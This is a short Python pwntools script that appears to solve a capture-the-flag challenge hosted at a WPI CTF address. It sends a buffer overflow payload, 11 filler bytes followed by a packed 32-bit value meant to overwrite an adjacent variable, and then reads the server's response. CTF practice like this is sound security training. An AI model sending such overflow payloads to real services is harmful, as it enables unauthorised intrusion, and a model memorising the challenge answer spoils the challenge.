#!/usr/bin/env python3

from pwn import *

p = remote('smash184384.wpictf.xyz', 15724)

payload  = b''
payload += 11 * b'A'
payload += p32(923992130)

p.sendline(payload)
p.recvuntil('string: ')
p.stream()